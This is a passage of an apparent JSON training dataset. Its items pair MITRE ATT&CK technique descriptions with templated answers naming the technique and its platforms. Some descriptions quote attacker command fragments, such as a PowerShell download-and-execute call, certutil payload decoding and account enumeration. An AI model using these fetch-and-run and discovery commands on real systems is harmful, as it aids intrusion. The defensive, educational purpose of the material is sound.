      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.",
      "answer": "The provided description is related to MITRE technique Network Service Discovery (T1046);\nTechnique Network Service Discovery (T1046) is applicable to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: IaaS,  Linux,  Network,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Brute Force (T1110);\nTechnique Brute Force (T1110) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.",
      "answer": "The provided description is related to MITRE technique Brute Force (T1110);\nTechnique Brute Force (T1110) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "context": "",
    "output": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "answer": "The provided description is related to MITRE technique Subvert Trust Controls: Code Signing (T1553.002);\nTechnique Subvert Trust Controls: Code Signing (T1553.002) is applicable to platforms: macOS, Windows;\nTherefore, the given procedure description is related to platforms: macOS, Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Deploy Container (T1610);\nTechnique Deploy Container (T1610) is applicable to platforms: Containers;\nTherefore, the given procedure description is related to platforms: Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. \n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.  In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.",
      "answer": "The provided description is related to MITRE technique Deploy Container (T1610);\nTechnique Deploy Container (T1610) is applicable to platforms: Containers;\nTherefore, the given procedure description is related to platforms: Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "answer": "The provided description is related to MITRE technique Proxy: External Proxy (T1090.002);\nTechnique Proxy: External Proxy (T1090.002) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
      "answer": "The provided description is related to MITRE technique Account Discovery (T1087);\nTechnique Account Discovery (T1087) is applicable to platforms: Google Workspace,  IaaS,  Linux,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Google Workspace,  IaaS,  Linux,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
